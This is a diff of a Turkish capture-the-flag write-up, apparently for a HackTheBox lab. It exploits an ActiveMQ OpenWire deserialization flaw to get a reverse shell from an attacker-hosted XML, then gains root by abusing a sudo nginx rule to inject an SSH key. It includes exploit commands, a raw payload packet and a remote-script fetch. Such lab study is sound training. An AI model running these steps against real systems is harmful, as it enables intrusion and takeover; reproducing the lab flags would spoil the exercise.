@@ -38,14 +38,7 @@ Tarama sonucu oldukça kalabalık — tek bir servis değil, tam bir ActiveMQ br
 
 <img width="680" height="645" alt="site2" src="https://github.com/user-attachments/assets/9be7cf46-0c9e-4aac-9d70-21559f2df31c" />
 
-Konsol bize broker'ın adını, ID'sini ve tam sürümünü doğruluyor:
-
-```
-Name: localhost
-Version: 5.15.15
-ID: ID:broker-39301-1788345209830-0:1
-Uptime: 11 minutes
-```
+Konsol bize broker'ın adını, ID'sini ve tam sürümünü doğruluyor.
 
 `5.15.15` teyit edildiğine göre artık bu sürüme ait bilinen açıkları aramaya geçebiliriz.
 
@@ -59,15 +52,15 @@ Uptime: 11 minutes
 
 Reflection ile hangi sınıfın çağrılacağı serbest bırakıldığında, asıl silahı seçen şey bir **gadget**tır. Bu exploit zincirinde kullanılan gadget `org.springframework.context.support.ClassPathXmlApplicationContext` — bu sınıfın constructor'ı kendisine verilen path/URL'i bir Spring bean XML tanım dosyası olarak yorumlayıp uzaktan çeker ve içindeki bean tanımlarını **anında instantiate eder**. Attacker-controlled bir XML içinde `ProcessBuilder`/`Runtime.exec()` çağıran bir bean tanımlanırsa, bean'in constructor'ı çalıştığı an sistem komutu çalışır — deserialization'ın "veri okuma" değil "kod çalıştırma" haline gelmesinin klasik yolu budur.
 
+<img width="859" height="505" alt="useit" src="https://github.com/user-attachments/assets/4ac2e971-6f12-4a05-90df-d5a8e4a2b593" />
+
 Öncelikle PoC XML'ini oluşturuyoruz, içine hangi IP/porta reverse shell açacağımızı gömerek:
 
 ```bash
 python3 generate_poc.py -i 10.10.14.187 -p 1001
 ```
 
-```
-[*] PoC XML written to poc-linux.xml
-```
+<img width="574" height="43" alt="generate" src="https://github.com/user-attachments/assets/6104535e-5a69-4574-a9d5-826dd7eb4a54" />
 
 Bu XML'i hedefin erişebileceği bir HTTP sunucusunda barındırıyoruz:
 
@@ -75,18 +68,15 @@ Bu XML'i hedefin erişebileceği bir HTTP sunucusunda barındırıyoruz:
 python3 -m http.server 2002
 ```
 
+<img width="628" height="118" alt="2002" src="https://github.com/user-attachments/assets/f701d5a6-a217-4dcf-a41b-4e5f859929b9" />
+
 Ve asıl exploit'i tetikliyoruz — `main.py`, hedefin 61616 portuna doğrudan OpenWire seviyesinde bağlanıp marshalling katmanını istismar eden ham paketi gönderir:
 
 ```bash
 python3 main.py -i 10.129.230.87 -u http://10.10.14.187:2002/poc-linux.xml
 ```
 
-```
-[*] Target: 10.129.230.87:61616
-[*] XML URL: http://10.10.14.187:2002/poc-linux.xml
-
-[*] Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e31342e3138373a323030322f706f632d6c696e75782e786d6c
-```
+<img width="1091" height="262" alt="main" src="https://github.com/user-attachments/assets/945d39a1-c110-4028-a3ce-44070466a22d" />
 
 Gönderilen ham paketin hex çıktısını incelersek, içinde `org.springframework.context.support.ClassPathXmlApplicationContext` sınıf ismi ile bizim HTTP sunucumuzun URL'sinin (`http://10.10.14.187:2002/poc-linux.xml`) açıkça taşındığını görüyoruz — bu paket, OpenWire protokolünün beklediği bir response formatına gizlenmiş, ama içeriği aslında marshaller'a "şu sınıfı, şu XML ile başlat" diyen bir komut. ActiveMQ paketi aldığı anda XML'i çekiyor, Spring context'ini inşa ediyor, context inşası sırasında bizim komutumuz çalışıyor.
 
@@ -108,20 +98,13 @@ activemq@broker:~$ cat user.txt
 35aa58f0993e0867e3daef939ccf22ee
 ```
 
+<img width="288" height="58" alt="userflag" src="https://github.com/user-attachments/assets/71a2b81c-db4c-48fc-bde3-87fa8e918337" />
+
 İlk flag'i aldık, şimdi privesc yollarına bakıyoruz.
 
 ### 4. Privilege Escalation — nginx Sudo Misconfiguration
 
-```
-activemq@broker:~$ sudo -l
-Matching Defaults entries for activemq on broker:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User activemq may run the following commands on broker:
-    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
-```
+<img width="752" height="163" alt="sudol" src="https://github.com/user-attachments/assets/f75b3786-41a4-45b3-b223-5464bd7da94f" />
 
 `activemq` kullanıcısı, şifre girmeden `/usr/sbin/nginx`'i **herhangi bir argümanla** root yetkisiyle çalıştırabiliyor. Kural tek bir binary'ye izin veriyor gibi görünse de asıl sorun burada: nginx `-c` parametresiyle keyfi bir konfigürasyon dosyası kabul eden bir binary. Root yetkisiyle çalışacak bir web sunucusunu kendi yazdığımız config ile başlatabilmek, fiilen root context'inde dosya sistemi üzerinde işlem yaptırabilmek anlamına geliyor — About kısmında referans verilen Zimbra advisory'siyle birebir aynı sınıf açık: sudo kuralı komutu kısıtlıyor ama komutun davranışını belirleyen konfigürasyonu hiç kısıtlamıyor.
 
@@ -131,39 +114,11 @@ GTFOBins'te nginx için bir entry bulunuyor ama kullanımı ilk bakışta net de
 
 `exploit.sh` dosyasını Kali'de barındırıp hedefe çekiyoruz:
 
-```
-activemq@broker:/tmp$ wget http://10.10.14.187:8000/exploit.sh
---2026-09-02 11:01:38--  http://10.10.14.187:8000/exploit.sh
-Connecting to 10.10.14.187:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 622 [application/x-sh]
-Saving to: 'exploit.sh'
-exploit.sh          100%[===================>]     622  --.-KB/s    in 0s
-```
-
-```
-activemq@broker:/tmp$ chmod +x exploit.sh
-activemq@broker:/tmp$ ./exploit.sh
-[+] Creating configuration...
-[+] Loading configuration...
-[+] Generating SSH Key...
-Generating public/private rsa key pair.
-Enter file in which to save the key (/home/activemq/.ssh/id_rsa):
-Created directory '/home/activemq/.ssh'.
-Enter passphrase (empty for no passphrase):
-Enter same passphrase again:
-Your identification has been saved in /home/activemq/.ssh/id_rsa
-Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
-The key fingerprint is:
-SHA256:4twMk7aA/Uk9uefpJl9aeUlq+68qQvDlasUQtVsGTpY activemq@broker
-[+] Display SSH Private Key for copy...
-cat: .ssh/id_rsa: No such file or directory
-[+] Add key to root user...
-cat: .ssh/id_rsa.pub: No such file or directory
-[+] Use the SSH key to get access
-```
+<img width="594" height="433" alt="exp1" src="https://github.com/user-attachments/assets/b28486af-16c3-4c83-b370-3edf06b01eac" />
 
 Script özünde şu adımları otomatikleştiriyor: önce bir SSH anahtar çifti üretiyor, ardından `sudo /usr/sbin/nginx -c <malicious.conf>` şeklinde, kendi yazdığı geçici bir konfigürasyon dosyasıyla nginx'i root yetkisinde başlatıyor. Bu config, nginx'in `root`/`alias` ve log directive mekanizmalarını suistimal ederek, ürettiğimiz **public key'i doğrudan root'un `authorized_keys` dosyasına yazdırıyor** — nginx root olarak çalıştığı için, normalde `activemq` kullanıcısının erişemeyeceği `/root/.ssh/authorized_keys` yoluna yazma işlemi sorunsuz gerçekleşiyor. Çıktıdaki `cat: .ssh/id_rsa: No such file or directory` hataları kozmetik; script relative path ile dosyayı okumaya çalışıp bulamıyor ama asıl işlemi (anahtar üretimi + authorized_keys enjeksiyonu) yine de tamamlıyor.
+
+<img width="554" height="616" alt="exp2" src="https://github.com/user-attachments/assets/b68148a1-dc8b-4f42-8268-6e68b5ae4726" />
 
 ```
 activemq@broker:~$ ls -al
@@ -227,3 +182,5 @@ cleanup.sh  root.txt
 root@broker:~# cat root.txt
 2b52eb54831f5f7b5c2098bf30abaa4e
 ```
+
+<img width="354" height="100" alt="rootflag" src="https://github.com/user-attachments/assets/09600d99-510e-42ca-857c-d5fb4f604f70" />
